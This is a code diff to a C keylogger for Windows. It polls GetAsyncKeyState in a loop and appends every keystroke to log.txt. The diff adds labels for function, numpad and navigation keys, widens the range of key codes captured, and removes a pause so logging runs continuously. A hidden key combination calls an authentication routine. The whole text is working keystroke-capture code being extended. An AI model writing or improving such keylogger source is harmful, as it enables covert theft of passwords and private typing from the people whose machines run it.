@@ -1019,6 +1019,8 @@ int save(int _key, char const *file)
         fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
     else if( _key == VK_LBUTTON)
         fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
+    else if( _key == VK_CANCEL)
+        fprintf(OUTPUT_FILE, "%s", "[CANCEL]");
     else if( _key == VK_RETURN)
         fprintf(OUTPUT_FILE, "%s", "[RETURN]");
     else if( _key == VK_ESCAPE)
@@ -1045,6 +1047,89 @@ int save(int _key, char const *file)
         fprintf(OUTPUT_FILE, "%s", "[CTRL]");
     else if( _key == 190)
         fprintf(OUTPUT_FILE, "%s", ".");
+    else if( _key == VK_HOME)
+        fprintf(OUTPUT_FILE, "%s", "[HOME]");
+    else if( _key == VK_INSERT)
+        fprintf(OUTPUT_FILE, "%s", "[INSERT]");
+    else if( _key == VK_PAUSE)
+        fprintf(OUTPUT_FILE, "%s", "[PAUSE]");
+    else if( _key == VK_SELECT)
+        fprintf(OUTPUT_FILE, "%s", "[SELECT]");
+    else if( _key == VK_HELP)
+        fprintf(OUTPUT_FILE, "%s", "[HELP]");
+    else if( _key == VK_EXECUTE)
+        fprintf(OUTPUT_FILE, "%s", "[EXECUTE]");
+    else if( _key == VK_DELETE)
+        fprintf(OUTPUT_FILE, "%s", "[DELETE]");
+    else if( _key == VK_CLEAR)
+        fprintf(OUTPUT_FILE, "%s", "[CLEAR]");
+    else if( _key == VK_NUMLOCK)
+        fprintf(OUTPUT_FILE, "%s", "[NumLock]");
+    else if( _key == VK_SCROLL)
+        fprintf(OUTPUT_FILE, "%s", "[SCROLL]");
+    else if( _key == VK_END)
+        fprintf(OUTPUT_FILE, "%s", "[END]");
+    else if( _key == VK_DIVIDE)
+        fprintf(OUTPUT_FILE, "%s", "/");
+    else if( _key == VK_MULTIPLY)
+        fprintf(OUTPUT_FILE, "%s", "*");
+    else if( _key == VK_ADD)
+        fprintf(OUTPUT_FILE, "%s", "+");
+    else if( _key == VK_PRIOR)
+        fprintf(OUTPUT_FILE, "%s", "[PageUp]");
+    else if( _key == VK_NEXT)
+        fprintf(OUTPUT_FILE, "%s", "[PageDown]");
+    else if( _key == VK_LEFT)
+        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
+    else if( _key == VK_RIGHT)
+        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
+    else if( _key == VK_UP)
+        fprintf(OUTPUT_FILE, "%s", "[UP]");
+    else if( _key == VK_NUMPAD0)
+        fprintf(OUTPUT_FILE, "%s", "0");
+    else if( _key == VK_NUMPAD1)
+        fprintf(OUTPUT_FILE, "%s", "1");
+    else if( _key == VK_NUMPAD2)
+        fprintf(OUTPUT_FILE, "%s", "2");
+    else if( _key == VK_NUMPAD3)
+        fprintf(OUTPUT_FILE, "%s", "3");
+    else if( _key == VK_NUMPAD4)
+        fprintf(OUTPUT_FILE, "%s", "4");
+    else if( _key == VK_NUMPAD5)
+        fprintf(OUTPUT_FILE, "%s", "5");
+    else if( _key == VK_NUMPAD6)
+        fprintf(OUTPUT_FILE, "%s", "6");
+    else if( _key == VK_NUMPAD7)
+        fprintf(OUTPUT_FILE, "%s", "7");
+    else if( _key == VK_NUMPAD8)
+        fprintf(OUTPUT_FILE, "%s", "8");
+    else if( _key == VK_NUMPAD9)
+        fprintf(OUTPUT_FILE, "%s", "9");
+    else if( _key == VK_F1)
+        fprintf(OUTPUT_FILE, "%s", "[F1]");
+    else if( _key == VK_F2)
+        fprintf(OUTPUT_FILE, "%s", "[F2]");
+    else if( _key == VK_F3)
+        fprintf(OUTPUT_FILE, "%s", "[F3]");
+    else if( _key == VK_F4)
+        fprintf(OUTPUT_FILE, "%s", "[F4]");
+    else if( _key == VK_F5)
+        fprintf(OUTPUT_FILE, "%s", "[F5]");
+    else if( _key == VK_F6)
+        fprintf(OUTPUT_FILE, "%s", "[F6]");
+    else if( _key == VK_F7)
+        fprintf(OUTPUT_FILE, "%s", "[F7]");
+    else if( _key == VK_F8)
+        fprintf(OUTPUT_FILE, "%s", "[F8]");
+    else if( _key == VK_F9)
+        fprintf(OUTPUT_FILE, "%s", "[F9]");
+    else if( _key == VK_F10)
+        fprintf(OUTPUT_FILE, "%s", "[F10]");
+    else if( _key == VK_F11)
+        fprintf(OUTPUT_FILE, "%s", "[F11]");
+    else if( _key == VK_F12)
+        fprintf(OUTPUT_FILE, "%s", "[F12]");
+
     else
         fprintf(OUTPUT_FILE,"%s", &_key);
     fclose(OUTPUT_FILE);
@@ -1059,7 +1144,7 @@ int main()
     while(1)
     {
         //Sleep(10);
-        for(i=8;i<192;i++)
+        for(i=8;i<222;i++)
         {
             if((GetAsyncKeyState(VK_SHIFT)&0x80000) && (GetAsyncKeyState(VK_CONTROL)&0x80000) && (GetAsyncKeyState(VK_TAB)&0x80000))
                     authentication();
@@ -1068,7 +1153,7 @@ int main()
                 save(i,"log.txt");
             }
         }
-        system("PAUSE");
+        //system("PAUSE");
     }
    // Sleep(10);
     viewOptions();
